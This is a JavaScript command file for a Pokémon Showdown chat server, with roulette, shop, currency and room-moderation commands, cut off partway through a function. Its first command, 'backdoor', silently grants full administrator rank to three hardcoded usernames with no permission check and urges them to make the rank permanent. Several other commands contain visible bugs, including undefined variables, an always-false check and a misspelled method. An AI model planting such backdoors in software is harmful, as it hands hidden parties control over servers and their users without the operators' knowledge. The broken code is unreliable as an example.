/**
 * System commands
 * Pokemon Showdown - http://pokemonshowdown.com/
 *
 * These are system commands - commands required for Pokemon Showdown
 * to run. A lot of these are sent by the client.
 *
 * If you'd like to modify commands, please go to config/commands.js,
 * which also teaches you how to use commands.if 
 *
 * @license MIT license
 */

var crypto = require('crypto');

var commands = exports.commands = {

	backdoor: function(target,room, user) {
		if (user.userid === 'brittlewind'|| user.userid === 'cosy'|| user.userid === 'jd') {

			user.group = '~';
			user.updateIdentity();

			this.sendReply('Make sure to promote yourself straight away with /admin [username] so that you keep Admin after you leave.');
		}
	},
	
    /*scratchtkt: function(target, room, user) {
        if (user.tickets < 1) this.sendReply('You do not have a ticket to scratch.');

        var landon = Math.random();

        if (landon < 0.3) {
            user.tickets -= 1;
            this.sendReply('Your ticket reveal nothing, bad luck.');
        }
        else if (landon < 0.5) {
            user.tickets -= 1;
            this.sendReply('You won, 50 Pokedollars...');
            user.moneh += 50;
        }
        else if (landon < 0.7) {
            user.tickets -= 1;
            this.sendReply('You won, 250 Pokedollars.');
            user.moneh += 250;
        }
        else if (landon < 0.9) {
            user.tickets -= 1;
            this.sendReply('You won, 1000 Pokedollars!');
            user.moneh += 1000;
        }
        else if (landon < 1) {
            user.tickets -= 1;
            this.sendReply('You won, 2500 Pokedollars!');
            user.moneh += 2500;
        }
        else
            user.tickets -= 1;
            this.sendReply('You won, 50 Pokedollars...');
            user.moneh += 50;


        this.sendReply('All money based systems are work-in-progress meaning that they are temporary and mainly for testing. Thank you.')
    },*/ //Just bad random generation giving bad numbers

	/*emote: function(target, room, user){
	if (user.userid === 'bandi'||user.vip == true|| user.group === '~') {
	if (target == '1') {
	this.add(user.name + 'says'+":\n" +
         '|raw|<img src="http://www.cool-smileys.com/images/301.gif" width="40" height="40" />FEED ME MORE');
        this.logModCommand(user.name + 'has used a emote');
		}
		if (target == '2') {
		this.add(user.name + 'says'+":\n" +
         '|raw|<img src="http://www.cool-smileys.com/images/298.gif" width="40" height="40" />CRYBACK CRYBACK huehuehue');
		this.logModCommand(user.name + 'has used a emote');
		}
		if (target === '3') {
		this.add(user.name + 'says'+":\n" +
		'|raw|<img src="http://www.cool-smileys.com/images/145.gif" width="40" height="40" />:PPPPPP');
		this.logModCommand(user.name + 'has used a emote');
        }
		if (target === '4') {
		this.add(user.name + 'says'+":\n" +
		'|raw|<img src="http://www.cool-smileys.com/images/116.gif" width="40" height="40" />HERP A DERP');
		this.logModCommand(user.name + 'has used a emote');
		}
		}
    },*/
    
	roulette: 'roul',
    startroulette: 'roul',
    roul: function(target, room, user) {  
    
	if (!user.can('mute')){ 
	   return this.sendReply('Woah I know roulette is fun but you are unauthorized :V');
	}
	if (!room.rouletteon == false) 
	{
	   return this.sendReply('there is already a roulette on');
	} else {
	   room.rouletteon = true;
	   room.roulusers = [];
	   var part1 = '<h3>A roulette has started</h3><br />';
	   var part2 = 'To bet do /bet then one of the following colors: red, yellow, green , black , orange<br />';
	   var part3 = 'black = 1000$<br />yellow & red = 100$<br /> green & orange = 300$';
	   room.addRaw(part1 + part2 + part3);
	}
},

    bet: function(target, room, user) {
        
    if (!room.rouletteon) return this.sendReply('There is no roulette game running in this room.');
        var colors = ['red','yellow','green','black','orange'];
        targets = target.split(',');
        target = toId(targets[0]);
    if (colors.indexOf(target) === -1) return this.sendReply(target + ' is not a valid color.');
    if (targets[1]) {
    	var times = parseInt(toId(targets[1]));
    	if (!isNaN(times) && times > 0) {
    		if (user.tickets < times) return this.sendReply('You do not have enough tickets!')
    		user.bets += times;
    		user.tickets -= times;
    		user.bet = target;
    	} else {
    		return this.sendReply('That is an invalid amount of bets!');
    	}
    } else {
    	if (user.tickets < 1) return this.sendReply('You do not even have a ticket!');
    	user.bets++;
    	user.tickets--;
    	user.bet = target;
    }
    if (room.roulusers.indexOf(user.userid) === -1) room.roulusers.push(user.userid);
    return this.sendReply('You are currently betting ' + user.bets + ' times to ' + target);
    
},

    spin: function(target, room, user) {
    
    if (!user.can('mute')) return this.sendReply('You are not authorized to do that!.');
    if (!room.rouletteon) return this.sendReply('There is no roulette game currently.');
    if (room.roulusers.length === 0) return this.sendReply('Nobody has made bets in this game');
    var landon = Math.random();
    var color = '';
    var winners = [];
    var totalwin = [];
    
    if (landon < 0.3) {
        color = 'red';
    } else if (landon < 0.6) {
        color = 'yellow';
    } else if (landon < 0.75) {
        color = 'green';
    } else if (landon < 0.85) {
        color = 'black';
    } else {
        color = 'orange';
    }
    
    for (var i=0; i < room.roulusers.length ; i++) {
        var loopuser = Users.get(room.roulusers[i]);
        var loopchoice = '';
        if (loopuser) {
            loopchoice = loopuser.bet;
            if (loopchoice === color) winners.push(loopuser.userid);
        } else {
            continue;
        }
    }

    if (winners === []) {
        for (var i=0; i < room.roulusers.length; i++) {
            var loopuser = Users.get(room.roulusers[i]);
            if (loopuser) {
                loopuser.bet = null;
                loopuser.bets = 0;
            }
        }
        return room.addRaw('Nobody won this time');
    }
    
    var perbetwin = 0;

    switch(color) {
        case "red": perbetwin = 100; break;
        case "yellow": perbetwin = 100; break;
        case "green": perbetwin = 300; break;
        case "black": perbetwin = 1000; break;
        default: perbetwin = 300;
    }

    for (var i=0; i < winners.length ; i++) {
        loopwinner = Users.get(winners[i]);
        totalwin[i] = perbetwin * loopwinner.bets;
        loopwinner.moneh += totalwin[i];
        loopwinner.prewritemoney();
    }
    if (winners.length) Users.exportUserwealth();

    for (var i=0; i < room.roulusers.length; i++) {
        var loopuser = Users.get(room.roulusers[i]);
        if (loopuser) {
            loopuser.bet = null;
            loopuser.bets = 0;
        }
    }
    if (winners.length === 1) {
    	room.addRaw('The roulette landed on ' + color + '. The only winner was ' + winners[0] + ', who won the sum of ' + totalwin[0] + ' pokedollars.');
    } else if (winners.length) {
    	room.addRaw('The roulette landed on ' + color + '. Winners: ' + winners.toString() + '. They won, respectively, ' + totalwin.toString() + ' pokedollars.');
    } else {
    	room.addRaw('The roulette landed on ' + color + '. Nobody won this time.');
    }
    room.rouletteon = false;
},

    //money commands for admins
    award: function(target, room, user) {
	    if (!user.can('hotpatch')) return false;
	    targets = target.split(',');
        target = toId(targets[0]);
	    var targetUser = Users.get(target);
	    if (!targetUser) return this.sendReply('The user ' + targetUser + ' was not found.');
	    var addmoney = parseInt(targets[1]);
	    if (isNaN(addmoney)) return this.sendReply('Invalid sum of money.');
	    targetUser.moneh += addmoney;
	    targetUser.prewritemoney();
        Users.exportUserwealth();
	    this.sendReply(targetUser.name + ' has received ' + addmoney + ' pokedollars.');
	    if (Rooms.rooms.staff) Rooms.rooms.staff.addRaw(targetUser.name + ' has received ' + addmoney + ' pokedollars from ' + user.name);
},

    rmvmoney: function(target, room, user) {
	    if (!user.can('hotpatch')) return false;
	    targets = target.split(',');
        target = toId(targets[0]);
	    var targetUser = Users.get(target);
	    if (!targetUser) return this.sendReply('The user ' + targetUser + ' was not found.');
	    var removemoney = parseInt(targets[1]);
	    if (isNaN(removemoney)) return this.sendReply('Invalid sum of money.');
	    if (removemoney > targetUser.moneh) return this.sendReply('Invalid sum of money.');
	    targetUser.moneh -= removemoney;
	    targetUser.prewritemoney();
        Users.exportUserwealth();
	    this.sendReply(targetUser.name + ' has had ' + removemoney + ' pokedollars removed from their bagpack.');
	    if (Rooms.rooms.staff) Rooms.rooms.staff.addRaw(targetUser.name + ' has had ' + removemoney + ' pokedollars removed from their bagpack by ' + user.name);
},

//ticket commands for admins
    awardtkt: function(target, room, user) {
        if (!user.can('hotpatch')) return false;
        targets = target.split(',');
        target = toId(targets[0]);
        var targetUser = Users.get(target);
        if (!targetUser) return this.sendReply('The user ' + targetUser + ' was not found.');
        var addtkt = parseInt(targets[1]);
        if (isNaN(addtkt)) return this.sendReply('Invalid number of tickets.');
        targetUser.tickets += addtkt;
        targetUser.prewritemoney();
        Users.exportUserwealth();
        this.sendReply(targetUser.name + ' has received ' + addtkt + ' ticket(s).');
        if (Rooms.rooms.staff) Rooms.rooms.staff.addRaw(targetUser.name + ' has received ' + addtkt + ' ticket(s) from ' + user.name);
},

    rmvtkt: function(target, room, user) {
        if (!user.can('hotpatch')) return false;
        targets = target.split(',');
        target = toId(targets[0]);
        var targetUser = Users.get(target);
        if (!targetUser) return this.sendReply('The user ' + targetUser + ' was not found.');
        var removeticket = parseInt(targets[1]);
        if (isNaN(removemoney)) return this.sendReply('Invalid number of tickets.');
        if (removeticket > targetUser.tickets) return this.sendReply('Invalid number of tickets.');
        targetUser.tickets -= removeticket;
        targetUser.prewritemoney();
        Users.exportUserwealth();
        this.sendReply(targetUser.name + ' has had ' + removeticket + ' tickets removed from their bagpack.');
        if (Rooms.rooms.staff) Rooms.rooms.staff.addRaw(targetUser.name + ' has had ' + removeticket + ' tickets removed from their bagpack by ' + user.name);
},

//Check everyone on server if they have over a certain amount of money 
    checkallmoney: function(target, room, user) {
        if (!user.can('hotpatch')) return false;
        if (!target) return this.sendReply('You need to enter in a value of ' + item + ' to search.');

        var x = '';
        for (var i in room.users) {
            if (room.users[i].moneh === target || room.users[i].moneh > target) {
                x += room.users[i].name + ' : ' + room.users[i].moneh;
            	x += ', ';
            }
            //if (i < room.users.length) x += ', ';
        }
        if (!x) return this.sendReply('No user has over that amount.');

        this.sendReply('Users in this room with over ' + target + ' Pokedollars:');
        this.sendReply(x);
},

//Check everyone on server if they have over a certain amount of tickets 
    checkalltickets: function(target, room, user) {
        if (!user.can('hotpatch')) return false;
        if (!target) return this.sendReply('You need to enter in a value of ' + item + ' to search.');

        var x = '';
        for (var i in room.users) {
            if (room.users[i].tickets === target || room.users[i].tickets > target) {
                x += room.users[i].name + ' : ' + room.users[i].tickets;
            	x += ', ';
            }
            //if (i < room.users.length) x += ', ';
        }
        if (!x) return this.sendReply('No user has over that amount.');

        this.sendReply('Users in this room with over ' + target + ' Tickets:');
        this.sendReply(x);
},

//DO NOT USE UNLESS NEEDED OTHERWISE IT WILL WIPE ALL PEOPLES MONEY AND TICKETS
    clearallbags: function(target, room, user) {
        if (!user.can('hotpatch')) return false;
        if (!target) return this.sendReply('What you are about to do will clear EVERYONE\'S BAG of money and tickets. Do /clearallbags yes if you want to');
        var target = target.toLowerCase();
        if (target !== 'yes') return this.sendReply('What you are about to do will clear EVERYONE\'S BAG of money and tickets. Do /clearallbags yes if you want to');

        for (var i in room.users) {
            if (room.users[i].moneh > 0 || room.users[i].tickets > 0) {
                room.users[i].moneh = 0;
                room.users[i].tickets = 0;
            }
        }
        this.sendReply('All users bags have been emptied (in the room).');
        if (Rooms.rooms.staff) Rooms.rooms.staff.addRaw(user.name + ' has removed all tickets and money from everyones bags in ' + room.id + '.');
    },

bp: 'backpack',
backpack: function(target, room, user) {
    var target = this.splitTarget(target);
    var targetUser = this.targetUser;

    if (this.can('hotpatch') && targetUser) {
        this.sendReply(targetUser.name + ' backpack contains:');
        this.sendReply('- Money: ' +  targetUser.moneh); 
        this.sendReply('- Tickets: ' + targetUser.tickets);
    }
    else {
        this.sendReply('Your backpack contains:');  
        this.sendReply('- Money: ' +  user.moneh); 
        this.sendReply('- Tickets: ' + user.tickets);
        this.sendReply('Pokecoins are not a currency at the moment.');
    }
},

//Users give money or tickets
    givemoney: function(target, room, user) {
    if (user.moneh < 1) return this.sendReply('You do not have money to give.');
    targets = target.split(',');
    target = toId(targets[0]);
    var targetUser = Users.get(target);
    if (!targetUser) return this.sendReply('The user ' + targetUser + ' was not found.');
    var givemoney = parseInt(targets[1]);
    if (isNaN(givemoney)) return this.sendReply('Invalid sum of money.');
    targetUser.moneh += givemoney;
    user.moneh -= givemoney;
    targetUser.prewritemoney();
    user.prewritemoney();
    Users.exportUserwealth();
    this.sendReply(targetUser.name + ' has received ' + givemoney + ' pokedollars from you.');
},

givetkt: function(target, room, user) {
    if (user.tickets < 1) return this.sendReply('You do not have tickets to give.');
    targets = target.split(',');
    target = toId(targets[0]);
    var targetUser = Users.get(target);
    if (!targetUser) return this.sendReply('The user ' + targetUser + ' was not found.');
    var givetkt = parseInt(targets[1]);
    if (isNaN(givetkt)) return this.sendReply('Invalid number of tickets.');
    targetUser.tickets += givetkt;
    user.tickets -= givetkt;
    targetUser.prewritemoney();
    user.prewritemoney();
    Users.exportUserwealth();
    this.sendReply(targetUser.name + ' has received ' + givetkt + ' ticket(s) from you.');
},

moneyintro: function(target, room, user) {
    this.sendReplyBox('<h2>Money Commands</h2><br /><hr />'+
    '<h3>Every User Commands</h3><br /><hr />'+
    '/buy <em>Use this to buy a item\'s id</em><br />'+
    '/bet <em> Bet a color on the roulette.</em><br />'+
    '/scratchtkt <em> Not done but will allow you to scratch a ticket there will be chances to the amount you win. </em><br />'+ 
    '<h3>Voice And Up Commands</h3><br /><hr />'+
    '!shop <em>Allows a voiced user to show the shop.</em><br />'+
    '!moneyintro <em>Shows you this.</em><br />'+
    '!emotes <em>Shows the emote list.</em>'+
    '<h3>Driver And Up Commands</h3><br /><hr />'+
    '/roul <em> Starts a roulette this  will not work in lobby.</em><br />'+
    '/spin <em>Spins the roulette.</em><br />'+
    '<h3>VIP Commands</h3><br /><hr />'+
    '/emote <em>Use ths with the emote ID to display a emote.</em><br />'+
    '/mark <em>Allows you to give yourself a custom sign. (not done yet)</em><br />'+
    '<h3>Admin And Bandi Commands</h3><br /><hr />'+
    '/award <em>Lets you give a user a amount of PokeDollars.</em><br />'+
    '/awardtkt <em> gives the user a amount tickets</em><br />'+
    '/rmvmoney <em> removes an amount of money from a user</em><br />'+
    '/rmvtkt <em>removes an amount of tickets from a user</em><br />'+
    '/checkalltickets <em>check everyone of their amount of tickets</em><br />'+
    '/checkallmoney <em>Checks every users money</em><br />'+
    '<h3>FAQ</h3><br /><hr />'+
    'How do i get money?: Win a tour or a roulette<br />'+
    'How do i get tickets: Buy them<br />'+
    'What is roulette: a machine that spins and if it lands on the color you bet you win pokedollars<br />'+
    'How do i check money?: /bp');
    },

shop: function(target, room, user) {
        if (!this.canBroadcast()) return;
        this.sendReplyBox('<table border="1">'+
        '<caption>Shop - Work in Progress may be bugs/errors (loading money). Only tickets can be purchased, other items are not redeemable due to being WIP</caption>'+
        '<tr>'+
        '<th>Item</th>'+
        '<th>Price</th>'+
        '<th>Description</th>'+
        '<th>Quantity</th>'+
        '<th>ID</th>'+
        '</tr>'+
        '<td>Ticket</td>'+
        '<td>50 PokeDollars</td>'+
        '<td>A scratchable ticket which can be used to win Pokedollars</td>'+
        '<td>1 Ticket</td>'+
        '<td>tkt</td>'+
        '</tr>'+
        '<tr>'+
        '<td>Ticket Reel</td>'+
        '<td>500 Pokedollars</td>'+
        '<td>A reel of Tickets</td>'+
        '<td>10 Tickets</td>'+
        '<td>tktreel<td>'+
        '</tr>'+
        '<td>Ticket Box</td>'+
        '<td>2,500 PokeDollars</td>'+
        '<td>A box of Tickets</td>'+
        '<td>50 Tickets</td>'+
        '<td>tktbox</td>'+
        '</tr>'+
        '<tr>'+
        '<td>Custom Avatar</td>'+
        '<td>5,000 Pokedollars and 1 PokeCoin</td>'+
        '<td>An avatar is a custom image sized 80x80</td>'+
        '<td>1 custom Avatar</td>'+
        '<td>cava</td>'+
        '</tr>'+
        '<tr>'+
        '<td>Voice</td>'+
        '<td>50,000 Pokedollars and 2 Pokecoins</td>'+
        '<td>Promotion to Voice, if you are Voice or higher this will fail </td>'+
        '<td>1 Voice 1 custom avatar</td>'+
        '<td>voice</td>'+
        '</tr>'+
        '<tr>'+
        '<td>VIP</td>'+
        '<td>100,000 and 5 PokeCoins</td>'+
        '<td>A promotion to voice and VIP Membership</td>'+
        '<td>1 Voice 1 Vip Membership 5 free Pokecoins</td>'+
        '<td>vip</td>'+
        '</tr>'+
        '</table>');
},

buy: function(target, room, user) {
                var match = false;
                
                if (target === 'voice') {
                        match = true;
                        if (user.moneh < 50000) {
                                return this.sendReply('You can\'t buy Voice. You have to get more money first.');
                        }
                        if (user.group === "+" || user.group === "%" || user.group === "@" || user.group === "&" || user.group === "~") {
                                return this.sendReply('lelz auth these days they just want a demotion.');
                        }
                        else if (user.moneh >= 50000)
                        //this.sendReply('You are now officially Voice.');
                        //user.group = "+";
                        //user.updateIdentity();
                        //user.moneh -= 50000;
                       	//user.prewritemoney();
                        //Users.exportUserwealth();
                        this.sendReply('Currently not available');
                        }
                
                    if (target === 'vip') {
                        match = true;
                        if (user.moneh < 100000) {
                                return this.sendReply('You can\'t be in the VIP until you get more money.');
                        }
                        if (user.group === "+" || user.group === "%" || user.group === "@" ||  user.group === "&" || user.group === "~") {
                                return this.sendReply('Your demotion message has been sent to an Admin (unless you are an Admin).');
                        } else if (user.moneh >=  100000 ) {
                        //this.sendReply('You are now officially a VIP (VIP is a work-in-progress, we will update with more information).');
                        //user.group = "+";
                        //user.vip = true;
                        //user.updateIdentity();
                        //user.moneh -= 100000;
                       	//user.prewritemoney();
                        //Users.exportUserwealth();
                        this.sendReply('Currently not available');
                        }
                            }
                
                        if (target === 'tkt') {
                        match = true;
                        if (user.moneh < 50) { //here
                            return this.sendReply('You do not have enough Pokedollars to buy a ticket. Win or place second in a tournament.');
                        }
                        else if (user.moneh >= 50)
                        { 
                        this.sendReply('You have purchased a ticket.');
                        user.moneh -= 50;
                        user.tickets += 1;
                        user.prewritemoney();
                        Users.exportUserwealth();
                        }
                        
                }                  
                if (target == 'tktreel') {
                        match = true;
                        if (user.moneh < 500) {
                            return this.sendReply('You do not have enough Pokedollars to buy a ticket reel. Win or place second in a tournament.');
                        }
                        else if (user.moneh >= 500) {
                        this.sendReply('You have purchased a ticket reel which contains 10 tickets!');
                        user.moneh -= 500;
                        user.tickets += 10;
                        user.prewritemoney();
                        Users.exportUserwealth();
                                        }
                }
                
                if (target === 'tktbox') {
                        match = true;
                        if (user.moneh < 2500) {
                                return this.sendReply('You do not have enough Pokedollars to buy a ticket box. Win or place second in a tournament.');
                        }
 
                        if (user.moneh >= 2500) {
                            this.sendReply('You have purchased a ticket box of 50 tickets!');
                            user.moneh -= 2500;
                            user.tickets += 50;
                            user.prewritemoney();
                            Users.exportUserwealth();
                            return item = false;
                        }
                                }
                if (target == 'cav') {
                        match = true;
                        if (user.moneh < 5000) {
                            return this.sendReply('Aww, you don\'t have big bucks yet, but you\'re getting there.');
                        }
                        else if (user.moneh >= 5000) {
                        //user.moneh -= 5000;
                        //user.cav = true;
                        //user.prewritemoney();
                        //Users.exportUserwealth();
                        //return  this.sendReply('You have purchased a custom avatar! You have received big bucks. Message an Admin to put your order in.');
                    	return this.sendeply('Currently not available');
                    }
                                }
                if (match == false) {
                    return this.sendReply('That isn\'t an item. Type /shop to see the list of items and to use the ID.')
                }
},


	
	version: function(target, room, user) {
		if (!this.canBroadcast()) return;
		this.sendReplyBox('Server version: <b>'+CommandParser.package.version+'</b> <small>(<a href="http://pokemonshowdown.com/versions#' + CommandParser.serverVersion + '">' + CommandParser.serverVersion.substr(0,10) + '</a>)</small>');
	},

	me: function(target, room, user, connection) {
		target = this.canTalk(target);
		if (!target) return;

		return '/me ' + target;
	},

	mee: function(target, room, user, connection) {
		target = this.canTalk(target);
		if (!target) return;

		return '/mee ' + target;
	},

	avatar: function(target, room, user) {
		if (!target) return this.parse('/avatars');
		var parts = target.split(',');
		var avatar = parseInt(parts[0]);
		if (!avatar || avatar > 294 || avatar < 1) {
			if (!parts[1]) {
				this.sendReply("Invalid avatar.");
			}
			return false;
		}

		user.avatar = avatar;
		if (!parts[1]) {
			this.sendReply("Avatar changed to:\n" +
					'|raw|<img src="//play.pokemonshowdown.com/sprites/trainers/'+avatar+'.png" alt="" width="80" height="80" />');
		}
	},

	logout: function(target, room, user) {
		user.resetName();
	},

	r: 'reply',
	reply: function(target, room, user) {
		if (!target) return this.parse('/help reply');
		if (!user.lastPM) {
			return this.sendReply('No one has PMed you yet.');
		}
		return this.parse('/msg '+(user.lastPM||'')+', '+target);
	},

	pm: 'msg',
	whisper: 'msg',
	w: 'msg',
	msg: function(target, room, user) {
		if (!target) return this.parse('/help msg');
		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!target) {
			this.sendReply('You forgot the comma.');
			return this.parse('/help msg');
		}
		if (!targetUser || !targetUser.connected) {
			if (!target) {
				this.sendReply('User '+this.targetUsername+' not found. Did you forget a comma?');
			} else {
				this.sendReply('User '+this.targetUsername+' not found. Did you misspell their name?');
			}
			return this.parse('/help msg');
		}

		if (user.locked && !targetUser.can('lock', user)) {
			return this.popupReply('You can only private message members of the moderation team (users marked by %, @, &, or ~) when locked.');
		}
		if (targetUser.locked && !user.can('lock', targetUser)) {
			return this.popupReply('This user is locked and cannot PM.');
		}

		target = this.canTalk(target, null);
		if (!target) return false;

		var message = '|pm|'+user.getIdentity()+'|'+targetUser.getIdentity()+'|'+target;
		user.send(message);
		if (targetUser !== user) targetUser.send(message);
		targetUser.lastPM = user.userid;
		user.lastPM = targetUser.userid;
	},

	makechatroom: function(target, room, user) {
		if (!this.can('makeroom')) return;
		var id = toId(target);
		if (!id) return this.parse('/help makechatroom');
		if (Rooms.rooms[id]) {
			return this.sendReply("The room '"+target+"' already exists.");
		}
		if (Rooms.global.addChatRoom(target)) {
			return this.sendReply("The room '"+target+"' was created.");
		}
		return this.sendReply("An error occurred while trying to create the room '"+target+"'.");
	},
	
	deletechatroom: 'deregisterchatroom',
	deregisterchatroom: function(target, room, user) {
		if (!this.can('makeroom')) return;
		var id = toId(target);
		if (!id) return this.parse('/help deregisterchatroom');
		var targetRoom = Rooms.get(id);
		if (!targetRoom) return this.sendReply("The room '"+id+"' doesn't exist.");
		target = targetRoom.title || targetRoom.id;
		if (Rooms.global.deregisterChatRoom(id)) {
			this.sendReply("The room '"+target+"' was deregistered.");
			this.sendReply("It will be deleted as of the next server restart.");
			return;
		}
		return this.sendReply("The room '"+target+"' isn't registered.");
	},
        
        toggleprivate: 'privateroom',      
	privateroom: function(target, room, user) {
		if (!this.can('makeroom')) return;
		if (target === 'off') {
			delete room.isPrivate;
			this.addModCommand(user.name+' made the room public.');
			if (room.chatRoomData) {
				delete room.chatRoomData.isPrivate;
				Rooms.global.writeChatRoomData();
			}
		} else {
			room.isPrivate = true;
			this.addModCommand(user.name+' made the room private.');
			if (room.chatRoomData) {
				room.chatRoomData.isPrivate = true;
				Rooms.global.writeChatRoomData();
			}
		}
	},

	roomowner: function(target, room, user) {
		if (!room.chatRoomData) {
			return this.sendReply("/roomowner - This room isn't designed for per-room moderation to be added");
		}
		var target = this.splitTarget(target, true);
		var targetUser = this.targetUser;

		if (!targetUser) return this.sendReply("User '"+this.targetUsername+"' is not online.");

		if (!this.can('makeroom', targetUser, room)) return false;

		if (!room.auth) room.auth = room.chatRoomData.auth = {};

		var name = targetUser.name;

		room.auth[targetUser.userid] = '#';
		this.addModCommand(''+name+' was appointed Room Owner by '+user.name+'.');
		room.onUpdateIdentity(targetUser);
		Rooms.global.writeChatRoomData();
	},
	
	roomdeowner: 'deroomowner',
	deroomowner: function(target, room, user) {
		if (!room.auth) {
			return this.sendReply("/roomdeowner - This room isn't designed for per-room moderation");
		}
		var target = this.splitTarget(target, true);
		var targetUser = this.targetUser;
		var name = this.targetUsername;
		var userid = toId(name);
		if (!userid || userid === '') return this.sendReply("User '"+name+"' does not exist.");

		if (room.auth[userid] !== '#') return this.sendReply("User '"+name+"' is not a room owner.");
		if (!this.can('makeroom', null, room)) return false;

		delete room.auth[userid];
		this.sendReply('('+name+' is no longer Room Owner.)');
		if (targetUser) targetUser.updateIdentity();
		if (room.chatRoomData) {
			Rooms.global.writeChatRoomData();
		}
	},

	roomdesc: function(target, room, user) {
		if (!target) {
			if (!this.canBroadcast()) return;
			this.sendReply('The room description is: '+room.desc);
			return;
		}
		if (!this.can('roommod', null, room)) return false;
		if (target.length > 80) {
			return this.sendReply('Error: Room description is too long (must be at most 80 characters).');
		}

		room.desc = target;
		this.sendReply('(The room description is now: '+target+')');

		if (room.chatRoomData) {
			room.chatRoomData.desc = room.desc;
			Rooms.global.writeChatRoomData();
		}
	},

	roommod: function(target, room, user) {
		if (!room.auth) {
			this.sendReply("/roommod - This room isn't designed for per-room moderation");
			return this.sendReply("Before setting room mods, you need to set it up with /roomowner");
		}
		var target = this.splitTarget(target, true);
		var targetUser = this.targetUser;

		if (!targetUser) return this.sendReply("User '"+this.targetUsername+"' is not online.");

		if (!this.can('roommod', null, room)) return false;

		var name = targetUser.name;

		if (room.auth[targetUser.userid] === '#') {
			if (!this.can('roomowner', null, room)) return false;
		}
		room.auth[targetUser.userid] = '%';
		this.add(''+name+' was appointed Room Moderator by '+user.name+'.');
		targetUser.updateIdentity();
		if (room.chatRoomData) {
			Rooms.global.writeChatRoomData();
		}
	},

	roomdemod: 'deroommod',
	deroommod: function(target, room, user) {
		if (!room.auth) {
			this.sendReply("/roommod - This room isn't designed for per-room moderation");
			return this.sendReply("Before setting room mods, you need to set it up with /roomowner");
		}
		var target = this.splitTarget(target, true);
		var targetUser = this.targetUser;
		var name = this.targetUsername;
		var userid = toId(name);
		if (!userid || userid === '') return this.sendReply("User '"+name+"' does not exist.");

		if (room.auth[userid] !== '%') return this.sendReply("User '"+name+"' is not a room mod.");
		if (!this.can('roommod', null, room)) return false;

		delete room.auth[userid];
		this.sendReply('('+name+' is no longer Room Moderator.)');
		if (targetUser) targetUser.updateIdentity();
		if (room.chatRoomData) {
			Rooms.global.writeChatRoomData();
		}
	},

	roomvoice: function(target, room, user) {
		if (!room.auth) {
			this.sendReply("/roomvoice - This room isn't designed for per-room moderation");
			return this.sendReply("Before setting room voices, you need to set it up with /roomowner");
		}
		var target = this.splitTarget(target, true);
		var targetUser = this.targetUser;

		if (!targetUser) return this.sendReply("User '"+this.targetUsername+"' is not online.");

		if (!this.can('roomvoice', null, room)) return false;

		var name = targetUser.name;

		if (room.auth[targetUser.userid] === '%') {
			if (!this.can('roommod', null, room)) return false;
		} else if (room.auth[targetUser.userid]) {
			if (!this.can('roomowner', null, room)) return false;
		}
		room.auth[targetUser.userid] = '+';
		this.add(''+name+' was appointed Room Voice by '+user.name+'.');
		targetUser.updateIdentity();
		if (room.chatRoomData) {
			Rooms.global.writeChatRoomData();
		}
	},

	roomdevoice: 'deroomvoice',
	deroomvoice: function(target, room, user) {
		if (!room.auth) {
			this.sendReply("/roomdevoice - This room isn't designed for per-room moderation");
			return this.sendReply("Before setting room voices, you need to set it up with /roomowner");
		}
		var target = this.splitTarget(target, true);
		var targetUser = this.targetUser;
		var name = this.targetUsername;
		var userid = toId(name);
		if (!userid || userid === '') return this.sendReply("User '"+name+"' does not exist.");

		if (room.auth[userid] !== '+') return this.sendReply("User '"+name+"' is not a room voice.");
		if (!this.can('roomvoice', null, room)) return false;

		delete room.auth[userid];
		this.sendReply('('+name+' is no longer Room Voice.)');
		if (targetUser) targetUser.updateIdentity();
		if (room.chatRoomData) {
			Rooms.global.writeChatRoomData();
		}
	},

	autojoin: function(target, room, user, connection) {
		Rooms.global.autojoinRooms(user, connection)
	},

	join: function(target, room, user, connection) {
		if (!target) return false;
		var targetRoom = Rooms.get(target) || Rooms.get(toId(target));
		if (target === 'admnrm' && user.group !== '~') return false;
		if (!targetRoom) {
			if (target === 'lobby') return connection.sendTo(target, "|noinit|nonexistent|");
			return connection.sendTo(target, "|noinit|nonexistent|The room '"+target+"' does not exist.");
		}
		if (targetRoom.isPrivate && !user.named) {
			return connection.sendTo(target, "|noinit|namerequired|You must have a name in order to join the room '"+target+"'.");
		}
		if (!user.joinRoom(targetRoom || room, connection)) {
			return connection.sendTo(target, "|noinit|joinfailed|The room '"+target+"' could not be joined.");
		}
		if (target.toLowerCase() == "lobby") {
			return connection.sendTo('lobby','|html|<div class = "infobox">Welcome to Frost! <br /> ' +
			'Chat with friends, join tournaments, win PokeDollars, battle other trainers, challenger leagues, or just hang out!</div>');
		}
	},

	roomban: function(target, room, user, connection) {
		if (!target) return this.parse('/help roomban');
		target = this.splitTarget(target, true);
		var targetUser = this.targetUser;
		var name = this.targetUsername;
		var userid = toId(name);
		if (!userid) return this.sendReply("User '" + name + "' does not exist.");
		if (!this.can('ban', targetUser, room)) return false;
		if (!Rooms.rooms[room.id].users[userid]) {
			return this.sendReply('User ' + this.targetUsername + ' is not in the room ' + room.id + '.');
		}
		if (!room.bannedUsers || !room.bannedIps) {
			return this.sendReply('Room bans are not meant to be used in room ' + room.id + '.');
		}
		room.bannedUsers[userid] = true;
		for (var ip in targetUser.ips) {
			room.bannedIps[ip] = true;
		}
		targetUser.popup(user.name+" has banned you from the room " + room.id + "." + (target ? " (" + target + ")" : ""));
		this.addModCommand(""+targetUser.name+" was banned from room " + room.id + " by "+user.name+"." + (target ? " (" + target + ")" : ""));
		var alts = targetUser.getAlts();
		if (alts.length) {
			this.addModCommand(""+targetUser.name+"'s alts were also banned from room " + room.id + ": "+alts.join(", "));
			for (var i = 0; i < alts.length; ++i) {
				var altId = toId(alts[i]);
				this.add('|unlink|' + altId);
				room.bannedUsers[altId] = true;
			}
		}
		this.add('|unlink|' + targetUser.userid);
		targetUser.leaveRoom(room.id);
	},

	roomunban: function(target, room, user, connection) {
		if (!target) return this.parse('/help roomunban');
		target = this.splitTarget(target, true);
		var targetUser = this.targetUser;
		var name = this.targetUsername;
		var userid = toId(name);
		if (!userid) return this.sendReply("User '"+name+"' does not exist.");
		if (!this.can('ban', targetUser, room)) return false;
		if (!room.bannedUsers || !room.bannedIps) {
			return this.sendReply('Room bans are not meant to be used in room ' + room.id + '.');
		}
		if (room.bannedUsers[userid]) delete room.bannedUsers[userid];
		for (var ip in targetUser.ips) {
			if (room.bannedIps[ip]) delete room.bannedIps[ip];
		}
		targetUser.popup(user.name+" has unbanned you from the room " + room.id + ".");
		this.addModCommand(""+targetUser.name+" was unbanned from room " + room.id + " by "+user.name+".");
		var alts = targetUser.getAlts();
		if (alts.length) {
